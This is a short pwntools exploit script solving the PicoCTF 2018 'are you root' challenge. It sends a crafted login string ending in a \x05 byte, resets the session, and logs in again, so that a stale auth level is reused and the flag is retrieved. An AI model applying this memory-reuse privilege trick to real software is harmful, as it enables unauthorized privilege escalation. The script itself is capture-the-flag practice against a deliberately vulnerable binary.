from pwn import *
context(log_level='debug',os='linux',arch='amd64')
binary = './PicoCTF_2018_are_you_root'
#r = remote("challenge.example.invalid", 9999, ssl=True, sni="challenge.example.invalid")
r = process(binary)
elf = ELF(binary)
def login(payload):
    payload = 'login '+payload
    r.sendlineafter("> ",payload)
def re_set():
    r.sendlineafter("> ",'reset')
def set_auth(payload):
    payload = 'set-auth '+payload
    r.sendlineafter("> ",payload)
def get_glag():
    r.sendlineafter("> ",'get-flag')
login('aaaaaaaa\x05')
re_set()
login('aaa')
#gdb.attach(r)
get_glag()
r.interactive()
